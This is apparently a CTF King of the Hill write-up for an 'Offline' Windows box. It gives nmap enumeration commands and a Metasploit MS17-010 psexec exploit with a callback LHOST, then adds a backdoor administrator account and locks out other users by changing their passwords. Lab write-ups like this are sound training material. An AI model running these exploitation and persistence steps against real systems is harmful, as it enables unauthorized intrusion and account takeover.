# Offline KOTH

### Enumeration
```bash
# basic port scan
sudo nmap -sS <target-ip>

# script scan port 80
sudo nmap -sV -sC -p 80 <target-ip>

# vulnerability port scan
sudo nmap -sV -p 445 --script smb-vuln* <target-ip>
```
User named scarra's password found on HTTP enumeration and server is running SMBv1 and is vulnerable to MS17-010.

### Attack
```bash
# metasploit attack to establish foothold
sudo msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set RHOST <target-ip>
set LHOST <attack-ip>
exploit

# create an administrator user 
shell
net user <username> <password> /add
net localgroup administrators <username> /add
```

### Defend
```bash
# change password of poki and scarra
net user poki <password>
net user scarra <password>

# find all flags
cd C:\
dir flag*.txt /s